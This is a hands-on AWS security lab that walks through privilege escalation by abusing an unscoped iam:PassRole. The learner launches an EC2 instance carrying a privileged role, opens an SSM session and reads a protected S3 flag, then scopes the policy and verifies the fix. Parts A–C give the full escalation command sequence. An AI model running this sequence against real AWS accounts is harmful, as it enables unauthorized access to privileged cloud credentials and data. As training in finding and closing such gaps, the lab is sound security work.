# Lab 5: PassRole + EC2 — New PassRole via Missing `iam:PassedToService` Condition

## What this lab teaches

In this lab you take over a privileged role **without ever having permission to assume it**. You do it by abusing `iam:PassRole` — one of the most commonly misconfigured IAM permissions — then you fix the misconfiguration and prove the fix works.

### First, the concept: what is PassRole?

AWS compute services like EC2, Lambda, and ECS often need to act on your behalf — a Lambda function needs an *execution role*, an EC2 instance needs an instance profile role to read from S3, and so on. **`iam:PassRole` is the permission that lets a user hand one of those roles to a service.** It is a gate: before AWS lets you attach role X to service Y, it checks that your identity is allowed to *pass* role X.

The key mental model for this lab:

> **You never "become" the role directly. You hand the role to a compute service, and then you read the role's credentials out of that service.**

This is what makes PassRole attacks sneaky. The attacker doesn't call `AssumeRole`. They launch an EC2 instance with a privileged role attached, then read that role's temporary credentials from inside the instance.

Two things make an unscoped PassRole dangerous:

1. **Which roles can you pass?** If the `Resource` is `"*"`, you can pass *any* role — including privileged ones.
1. **To which services can you pass them?** If there's no `iam:PassedToService` condition, you can pass a role to *any* service — including EC2, even if the permission was only ever meant for Lambda.

This lab exploits both gaps at once.

### A note on the identities you'll switch between

This lab juggles three identities. Keep this straight as you go:

| Identity | What it is | When you use it |
| --- | --- | --- |
| `iamws-ci-runner-user` | The attacker. A CI runner with an over-broad PassRole. | Parts A–C: recon and the exploit |
| `iamws-lab-default` | Your admin. | Checking SSM status, and all of Part D (defense) |
| (no profile) | Credentials of `iamws-prod-deploy-role`, read from the instance metadata service | Only *inside* the SSM session in Steps 7–8 |

---

## Scenario 3: PassRole + EC2 — New PassRole via Missing `iam:PassedToService` Condition

**Category:** New PassRole
**Starting Identity:** `iamws-ci-runner-user`
**Target:** Crown jewels via an EC2 instance launched with `iamws-prod-deploy-role` passed to the EC2 instance as the profile `iamws-prod-deploy-profile`

**The Vulnerability:** `iamws-ci-runner-user` has `iam:PassRole` that was *intended* only for Lambda deployments. But the permission has `Resource: "*"` and no `iam:PassedToService` condition. Without that condition, PassRole works for **any** AWS service — including EC2 — and **any** role, including privileged ones.

**Real-world scenario:**
- A deployer principal has a policy allowing both `iam:PassRole` so they can hand Lambda functions their execution roles at deploy time, plus `ec2:RunInstances` for spinning up build and dev infrastructure.
- The PassRole statement was copy-pasted from a Stack Overflow answer or AWS docs example that didn't include the `iam:PassedToService` condition. Without that condition, PassRole isn't actually scoped to Lambda — it works for any AWS service.
- The attacker passes a privileged role to EC2 instead, launches an instance with the privileged role attached, and reads the role's credentials off the instance metadata service.

> [!NOTE]
> An EC2 *instance profile* is a wrapper around an IAM role that lets you attach the role to a virtual machine. Once attached, the instance can fetch temporary credentials for that role from the *instance metadata service* — a special address (`169.254.169.254`) reachable only from inside the instance. Any program running on the instance can then call AWS APIs *as that role*. So the chain is: pass the role to EC2 → launch the instance → read the role's credentials from metadata → act as the role. `iam:PassRole` is one gate standing between an attacker and that chain.

### Part A: Identify with iam-recon

Confirm, using recon tooling, that `iamws-ci-runner-user` has a path to admin through PassRole — before you try to exploit it.

Run the privilege escalation preset scoped to this scenario's principal — this scenario's EC2 edge IS visible here:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user
```

Expected output:
```
  user/iamws-ci-runner-user can escalate to admin:
    arn:aws:iam::<aws account id>:user/iamws-ci-runner-user user/iamws-ci-runner-user can launch EC2 instances with role/iamws-prod-deploy-role arn:aws:iam::<aws account id>:role/iamws-prod-deploy-role
```

Read this as: "`iamws-ci-runner-user` can reach the privileged `iamws-prod-deploy-role` **by way of EC2**."

Confirm the specific permission:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-ci-runner-user \
  --action iam:PassRole
```

Expected output:
```
ALLOW user/iamws-ci-runner-user can call iam:PassRole with *
```

The `*` allows this user to pass *any* role.

Cross-reference with pathfinding.cloud — scoped to this principal:

```bash
iam-recon --account $ACCOUNT_ID pathfinding --principal user/iamws-ci-runner-user
```

Expected output:
```
  user/iamws-ci-runner-user — 2 paths matched:

  [ssm-001] ssm:StartSession (existing-passrole)
    Permissions: ssm:StartSession
    https://www.pathfinding.cloud/paths/ssm-001

  [ec2-001] iam:PassRole + ec2:RunInstances (new-passrole)
    Permissions: iam:PassRole, ec2:RunInstances
    https://www.pathfinding.cloud/paths/ec2-001
```

Notice the matched [ec2-001] path needs **two** permissions together: `iam:PassRole` *and* `ec2:RunInstances`.

**In the interactive visualization:** search for `ci-runner-user`. The node is orange with a path to the `iamws-prod-deploy-role` node in red. Click the `ci-runner-user` user. Click the `iamws-ci-runner-policy` annotated with 1 risk. `iam-recon` highlights that this policy has an unscoped `iam:PassRole` permission.

### Part B: Understand the Attack

Visit [pathfinding.cloud/paths/ec2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole — "New" because you create a *new* compute resource (an EC2 instance) to carry the role, rather than modifying an existing one.
- **Required permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to role permissions via EC2

The point to internalise before you exploit: **PassRole attacks are indirect.** The attacker doesn't call `AssumeRole` and doesn't become the role directly. They hand the role to a compute service, launch the resource, and let the service expose the role's credentials. One fix, therefore, isn't to remove PassRole — which in our scenario is legitimately needed for the developer's work with Lambda functions, it's to scope *which role* can be passed and *to which service* it may be passed.

### Part C: Exploit the Vulnerability

**Step 1: Try the crown jewels — you're denied**

First, confirm that `iamws-ci-runner-user` cannot access the crown jewels bucket directly.

Attempt to access the crown jewels — expect a 403:

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
```

Expected output:
```
fatal error: An error occurred (403) when calling the HeadObject operation: Forbidden
```

**Step 2: Find a suitable AMI**

To launch an EC2 instance you need two things: a machine image (AMI) to boot from, and a subnet to place it in. The command below finds the latest Amazon Linux 2 AMI — a lightweight, AWS-maintained image that comes with the SSM agent pre-installed, which you'll use in a later step to connect to the instance without needing SSH or a key pair.

```bash
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' --output text \
  --profile iamws-ci-runner-user)

echo "AMI: $AMI_ID"
```

**Step 3: Find a suitable subnet**

Now the second thing EC2 needs: which VPC subnet to place the instance in. This grabs the id for the default subnet in your AWS account.

```bash
SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=default-for-az,Values=true" \
  --query 'Subnets[0].SubnetId' --output text \
  --profile iamws-ci-runner-user)

echo "Subnet: $SUBNET_ID"
```

**Step 4: See which role the instance profile carries**

The `iamws-prod-deploy-profile` instance profile is already created for you as part of the lab infrastructure. It "wraps" the privileged `iamws-prod-deploy-role`. As you learned earlier, an *instance profile* is just a thin container for exactly one IAM role in the context of attaching it to an ec2 instance. You can verify this with the following command:

```bash
aws iam get-instance-profile \
  --instance-profile-name iamws-prod-deploy-profile \
  --query 'InstanceProfile.Roles[].RoleName' --output text \
  --profile iamws-lab-default
```

Expected output:
```
iamws-prod-deploy-role
```

So attaching `iamws-prod-deploy-profile` to an EC2 instance means you are handing the instance the privileged `iamws-prod-deploy-role`.

**Step 5: Launch EC2 with the privileged instance profile**

This is the exploit itself. The `--iam-instance-profile Name=iamws-prod-deploy-profile` flag is what exercises `iam:PassRole`.

```bash
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id $AMI_ID --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --subnet-id $SUBNET_ID \
  --query 'Instances[0].InstanceId' --output text \
  --profile iamws-ci-runner-user)

echo "Launched: $INSTANCE_ID"
```

Expected output:

```
Launched <instance ID>
```

No error — unrestricted PassRole let you attach the privileged `iamws-prod-deploy-profile` to your newly launched EC2 instance.

**Step 6: Wait for the SSM agent to register (~90 seconds)**

Next you need a way onto the instance. Instead of SSH, you'll use AWS Systems Manager (SSM) Session Manager. SSM lets you open a shell without key pairs or open inbound ports — the instance's SSM agent initiates an *outbound* connection to the SSM service and registers itself. You have to wait for that registration to complete before you can open a session.

> [!NOTE]
> You check the agent status with `iamws-lab-default` (your admin identity), not the attacker identity, because `iamws-ci-runner-user` lacks `ssm:DescribeInstanceInformation`. You'll connect to the session itself as `iamws-ci-runner-user` in the next step. (See the identity table at the top of this lab if this is confusing.)

Wait 90 seconds for the agent to register:

```bash
sleep 90
```

Check that the agent is online:

```bash
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
  --query 'InstanceInformationList[0].PingStatus' --output text \
  --profile iamws-lab-default
```

Expected output: `Online`. If blank, wait a bit longer and retry.

**Step 7: Start an SSM session**

Use the following command to pop a shell on the new EC2 instance via SSM. Once you're inside the shell, something important happens: any AWS API call you make automatically uses the *instance's* attached role (`iamws-prod-deploy-role`), fetched from the EC2 metadata service — **not** your `iamws-ci-runner-user` credentials. This is the moment the indirection pays off.

```bash
aws ssm start-session --target $INSTANCE_ID \
  --profile iamws-ci-runner-user
```

Expected output:

```
Starting session with SessionId: iamws-ci-runner-user-rst2rtcuxbj3h6n5hghofx9reu
```

**Step 8: Claim the crown jewels from inside the session**

You're now effectively operating as the privileged role. First prove it — check who AWS thinks you are:

```bash
aws sts get-caller-identity
```

Expected output

```
{
    "Account": "<aws account id>",
    "UserId": "AROA<role id>:i-02a4efee5e583a76e",
    "Arn": "arn:aws:sts::<aws account id>:assumed-role/iamws-prod-deploy-role/i-02a4efee5e583a76e"
}
```

Expected output shows `iamws-prod-deploy-role`.

Capture your account ID (note: no `--profile` flag here — you are running commands on the EC2 instance and these credentials come from the metadata service, not a configured profile):

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
```

Access the crown jewels — the same command that gave you a 403 in Step 1:

```bash
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

It works this time. That contrast — denied in Step 1, allowed here — is the whole attack in two commands.

Exit the EC2 instance session to return to your local terminal:

```bash
exit
```

### Part D: Apply the Defense

**Goal of this part:** scope PassRole so it still works for its legitimate purpose (Lambda) but no longer lets the user hand a privileged role to EC2.

**Step 1: Apply a scoped inline policy**

The policy has two statements. The first rewrites PassRole with three simultaneous constraints — Action, Resource, and Condition. The second preserves the EC2 permissions the CI runner genuinely needs for build infrastructure. Before you run it, look closely at the Resource in Statement 1: `iamws-ci-runner-role` is the CI runner's *own* role — the one it's legitimately allowed to hand off — **not** a privileged role like `iamws-prod-deploy-role`. Scoping to a specific ARN instead of `*` is what stops the user passing arbitrary roles.

You may need to re-set your account ID (needed to build the role ARN inside the policy document):

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
```

Apply the inline policy:

```bash
aws iam put-user-policy \
  --user-name iamws-ci-runner-user \
  --policy-name SecurePassRole \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [
      {
        "Sid": "AllowPassRoleToLambdaOnly",
        "Effect": "Allow",
        "Action": "iam:PassRole",
        "Resource": "arn:aws:iam::'${ACCOUNT_ID}':role/iamws-ci-runner-role",
        "Condition": {"StringEquals": {"iam:PassedToService": "lambda.amazonaws.com"}}
      },
      {
        "Sid": "AllowEC2Operations",
        "Effect": "Allow",
        "Action": ["ec2:RunInstances","ec2:DescribeInstances","ec2:DescribeImages",
                   "ec2:DescribeSecurityGroups","ec2:DescribeSubnets","ec2:DescribeKeyPairs"],
        "Resource": "*"
      }
    ]
  }'
```

**What each statement does:**

`AllowPassRoleToLambdaOnly` has three constraints:
- **Action: `iam:PassRole`** — this specific action only, not `iam:*`
- **Resource: `iamws-ci-runner-role`** — `iam:PassRole` is only allowed for `ci-runner-role`; if the user tries to pass `iamws-prod-deploy-role` or any other role, this statement doesn't apply
- **Condition: `iam:PassedToService: lambda.amazonaws.com`** — only when the destination is Lambda; an `ec2:RunInstances` call with a `--iam-instance-profile` flag targets EC2, not Lambda, so this condition fails and the statement does nothing

If any one of the three doesn't match, the statement will not evaluate to allow.

**Step 2: Detach the overly-permissive managed policy**

IAM evaluates *all* of a principal's attached policies together and grants access if *any* of them allows an action, and there is no explicit deny. Our new scoped policy does not `DENY` any actions, it just better scopes the circumstances under which the actions are allowed.

Currently, the original `iamws-ci-runner-policy` is still attached to the user and still has an unrestricted PassRole. Leaving it attached would make the inline policy pointless — the broad allow would still win. So you must remove the old policy to actually close the gap.

```bash
aws iam detach-user-policy \
  --user-name iamws-ci-runner-user \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy 2>/dev/null || true
```

### Part E: Verify the Remediation

**Goal of this part:** prove two things — the legitimate Lambda path still works, and the EC2 attack path is now blocked.

**Step 1: Confirm the attack path is blocked with simulate-principal-policy**

Legitimate path — pass the user's own role to Lambda (should still work):

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-ci-runner-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
  --context-entries '[{"ContextKeyName":"iam:PassedToService","ContextKeyValues":["lambda.amazonaws.com"],"ContextKeyType":"string"}]' \
  --query 'EvaluationResults[0].EvalDecision'
```

Expected output: `"allowed"` — the legitimate Lambda PassRole still works. The defense didn't break the CI runner's real job.

Attack path — pass the privileged role to EC2 (should fail):

```bash
aws iam simulate-principal-policy \
  --policy-source-arn arn:aws:iam::${ACCOUNT_ID}:user/iamws-ci-runner-user \
  --action-names iam:PassRole \
  --resource-arns arn:aws:iam::${ACCOUNT_ID}:role/iamws-prod-deploy-role \
  --context-entries '[{"ContextKeyName":"iam:PassedToService","ContextKeyValues":["ec2.amazonaws.com"],"ContextKeyType":"string"}]' \
  --query 'EvaluationResults[0].EvalDecision'
```

Expected output: `"implicitDeny"` — the EC2 PassRole path is blocked. ("implicitDeny" means that because no attached statement allows it, the policy evaluation decision defaults to `deny`)

**Step 2: Verify with iam-recon**

Refresh the graph so recon sees the new policy:

```bash
iam-recon graph create --profile iamws-lab-default
```

Re-run the privilege escalation preset scoped to this principal:

```bash
iam-recon --account $ACCOUNT_ID argquery --preset privesc --principal user/iamws-ci-runner-user
```

Expected output:
```
  user/iamws-ci-runner-user cannot escalate to admin.
```

The EC2 PassRole edge to `iamws-prod-deploy-role` is gone. iam-recon's EC2 edge checker correctly evaluates `iam:PassedToService`, so it now agrees the path is closed.

Confirm the specific attack permission is denied:

```bash
iam-recon --account $ACCOUNT_ID argquery \
  --principal user/iamws-ci-runner-user \
  --action iam:PassRole \
  --resource 'arn:aws:iam::*:role/iamws-prod-deploy-role'
```

Expected output:
```
DENY user/iamws-ci-runner-user cannot call iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role
```

**In the interactive visualization:** search for `ci-runner-user`. The node is now blue (User). The EC2 edge to `iamws-prod-deploy-role` is gone. The `IDENTITY` panel lists `SecurePassRole` as the only policy.

### What You Learned

- `iam:PassRole` is the permission that lets a user hand an IAM role to an AWS service — for example, giving a Lambda function its execution role. Without constraints, that same permission lets an attacker hand *any* role to *any* service, including a privileged role to EC2.
- PassRole attacks are **indirect**: the attacker never calls `AssumeRole`. They hand a role to a compute service and read its credentials back out — here, from the EC2 instance metadata service.
- The `iam:PassedToService` condition key tells AWS which service is allowed to receive the role. Without it, PassRole is a blank check — the user's intended action (Lambda deployment) and the attacker's exploit (EC2 launch) look identical to IAM.
- Scoping both the Resource (a specific role ARN) and the Condition (a specific service) creates two independent constraints. An attacker would need to pass the exact allowed role *and* pass it to the exact allowed service — defeating either one blocks the path.
- IAM evaluates every attached policy together and allows a call if any policy permits it — so a tight inline policy is useless while a broad managed policy is still attached. You have to remove the broad grant too.

---

**Next:** [Lab 6: Privilege Escalation via Lambda UpdateFunctionCode](../lab-6-lambda-updatefunctioncode/README.md)
